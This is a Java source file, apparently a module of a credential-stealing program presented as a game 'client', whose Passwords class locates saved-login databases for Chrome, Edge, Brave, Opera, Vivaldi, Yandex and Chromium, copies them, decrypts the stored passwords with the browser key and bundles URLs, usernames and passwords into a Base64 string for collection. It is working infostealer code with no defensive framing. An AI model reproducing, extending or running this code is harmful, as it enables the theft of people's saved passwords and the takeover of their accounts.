package dev.client.module.browsers;

import com.google.gson.JsonArray;
import com.google.gson.JsonElement;
import com.google.gson.JsonObject;

import java.io.File;
import java.nio.file.Files;
import java.sql.Connection;
import java.sql.ResultSet;
import java.util.Base64;
import java.util.HashMap;
import java.util.Properties;
import dev.client.utils.client.DecryptUtil;
import dev.client.utils.client.KeyUtil;
import dev.client.utils.client.DriverUtil;

public class Passwords {
    private static final File appData = new File(System.getenv("APPDATA"));
    private static final File localAppData = new File(System.getenv("LOCALAPPDATA"));
    private static final HashMap<String, String> paths = new HashMap<String, String>() {
        {
            put("Google Chrome", localAppData + "\\Google\\Chrome\\User Data");
            put("Microsoft Edge", localAppData + "\\Microsoft\\Edge\\User Data");
            put("Chromium", localAppData + "\\Chromium\\User Data");
            put("Opera", appData + "\\Opera Software\\Opera Stable");
            put("Opera GX", appData + "\\Opera Software\\Opera GX Stable");
            put("Brave", localAppData + "\\BraveSoftware\\Brave-Browser\\User Data");
            put("Vivaldi", localAppData + "\\Vivaldi\\User Data");
            put("Yandex", localAppData + "\\Yandex\\YandexBrowser\\User Data");
        }
    };
    private final JsonArray pswds = new JsonArray();
    public String grabPassword() {
        stealUserData();
        String pswdStr = "";
        for (JsonElement pswd : pswds)
        {
            pswdStr += "\n=========<benadryl>==========\nURL: " + pswd.getAsJsonObject().get("url").getAsString() + "\nUSER: " + pswd.getAsJsonObject().get("username").getAsString() + "\nPASS: " + pswd.getAsJsonObject().get("password").getAsString() + "\n=========<benadryl>==========\n";
        }
        return Base64.getEncoder().encodeToString(pswdStr.getBytes());
    }
    private void stealUserData() {
        for (String browser : paths.keySet()) {
            File userData = new File(paths.get(browser));
            if (!userData.exists()) continue;
            byte[] key = KeyUtil.getKey(new File(userData, "Local State"));
            for (File data: userData.listFiles()) {
                if (data.getName().contains("Profile") || data.getName().equals("Default")) {
                    lickPasswords(data, key);
                } else if (data.getName().equals("Login Data")) {
                    lickPasswords(userData, key);
                }
            }
        }
    }

    private void lickPasswords(File profile, byte[] key) {
        try {
            File loginData = new File(profile, "Login Data");
            File tempLoginData = new File(profile, "Temp Login Data");
            if (!loginData.exists()) return;
            Files.copy(loginData.toPath(), tempLoginData.toPath(), java.nio.file.StandardCopyOption.REPLACE_EXISTING);
            java.sql.Driver driver = DriverUtil.getDriver();
            Properties props = new Properties();
            Connection connection = driver.connect("jdbc:sqlite:" + tempLoginData.getAbsolutePath(), props);
            ResultSet resultSet = connection.createStatement().executeQuery("SELECT origin_url, username_value, password_value FROM logins");
            while (resultSet.next()) {
                byte[] encryptedPassword = resultSet.getBytes(3);
                String decryptedPassword = DecryptUtil.decrypt(encryptedPassword, key);
                if (decryptedPassword != null || (resultSet.getString(1) != null && resultSet.getString(2) != null)) {
                    JsonObject pswd = new JsonObject();
                    pswd.addProperty("url", (!resultSet.getString(1).equals("")) ? resultSet.getString(1) : "N/A");
                    pswd.addProperty("username", (!resultSet.getString(2).equals("")) ? resultSet.getString(2) : "N/A");
                    pswd.addProperty("password", decryptedPassword);
                    pswds.add(pswd);
                }
            }
        } catch (Exception e) {
        }
    }
  //  public String count() {
    //     int count = 0;
    //    for (JsonElement pswd : pswds) {
     //       JsonObject pswdObject = pswd.getAsJsonObject();
      //     if (pswdObject.has("url")) {
       //         count++;
        //    }
       // }
        //return String.valueOf(count);
   // }
}
